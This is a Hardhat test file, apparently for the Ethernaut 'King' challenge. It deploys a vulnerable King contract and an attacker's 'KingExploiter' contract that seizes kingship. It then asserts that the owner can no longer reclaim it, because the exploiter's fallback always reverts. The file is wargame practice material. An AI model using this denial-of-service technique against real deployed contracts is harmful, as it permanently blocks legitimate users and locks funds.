import { expect } from "chai";
import { ethers } from "hardhat";
import { King as KingContract } from "../gen/types";
import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers";

describe("King Exploit", () => {

  let contract: KingContract;
  let _owner: SignerWithAddress;
  let _attacker: SignerWithAddress;

  beforeEach("Set up king contract", async () => {
    const [owner, attacker] = await ethers.getSigners();

    _owner = owner;
    _attacker = attacker;
    let contractFactory = (await ethers.getContractFactory("King"));
    // Deploy King contract with owner as message sender
    contract = await contractFactory.deploy();
  })
  

  it("EOA should become new king and prevent future new kings", async () => {
    let king = await contract._king();

    console.log(`Starting king is ${king}`)

    // Deploy attack contract with enough eth that will win the prize
    const attackerContract =  await (await ethers.getContractFactory("KingExploiter", _attacker)).deploy({value: (await contract.prize()).add(50)})

    // Call king
    await attackerContract.attack(contract.address)

    king = await contract._king();
    console.log(`Ending king is ${king}`)

    expect(king).to.eql(attackerContract.address)

    // owner should not be able to become king again
    try {
      await _owner.sendTransaction({
        to: contract.address,
        value: (await contract.prize()).add(50),
        gasLimit: 50000
      })
      expect.fail("Test should fail to set new king after attack");
    } catch(err) {
      expect(err.message).to.contain("revert", "mFallback function always fails");
    }
  })
});
